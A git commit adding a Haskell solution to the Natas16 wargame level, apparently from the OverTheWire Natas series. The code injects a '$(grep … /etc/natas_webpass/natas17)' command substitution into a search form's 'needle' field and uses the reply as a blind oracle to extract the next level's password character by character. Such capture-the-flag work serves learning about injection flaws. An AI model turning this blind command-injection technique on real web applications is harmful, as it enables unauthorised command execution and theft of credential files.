69a45e27552963170eacabdcd1c59f9435f37626
Yakov Pechersky <pechersk@deshawresearch.com>
2018-02-08 17:12:36 -0500

    natas16 soln

---
+++ src/Natas/Natas16.hs
@@ -0,0 +1,48 @@
+{-# LANGUAGE OverloadedStrings #-}
+
+module Natas.Natas16 where
+
+import           Control.Monad       (filterM)
+
+import           Data.List           (intersperse)
+import           Data.Text           (breakOn, pack)
+
+import           Control.Monad.Loops (firstM)
+import           Network.Wreq        (partText)
+
+import           Natas.Natas
+
+solution :: Solution
+solution = do
+  presentChars <- filterM (attemptPassword . pure) validChars
+  print presentChars
+  match <- buildPassword presentChars ""
+  pure $ fmap pack match
+
+buildPassword :: String -> String -> IO (Maybe String)
+buildPassword avail curr = do
+  let placeEnd x = curr ++ pure x
+      headMatch = attemptPassword . ("^" ++)
+  matches <- (firstM headMatch . fmap placeEnd) avail
+  case matches of
+    Nothing -> pure (pure curr)
+    Just match -> do
+      print match
+      buildPassword avail match
+
+attemptPassword :: String -> IO Bool
+attemptPassword guess = do
+  let uniqword = "unique"
+      shellInject =
+        (pack . concat)
+          ["$(grep " , guess, " /etc/natas_webpass/natas17)", uniqword]
+      form = partText "needle" shellInject
+  req <- postLevel 16 form
+  let body = reqBody req
+  pure $
+    case breakOn (pack uniqword) body of
+      (_match, "") -> True
+      _tupmatch    -> False
+
+validChars :: String
+validChars = ['0' .. '9'] ++ ['A' .. 'Z'] ++ ['a' .. 'z']
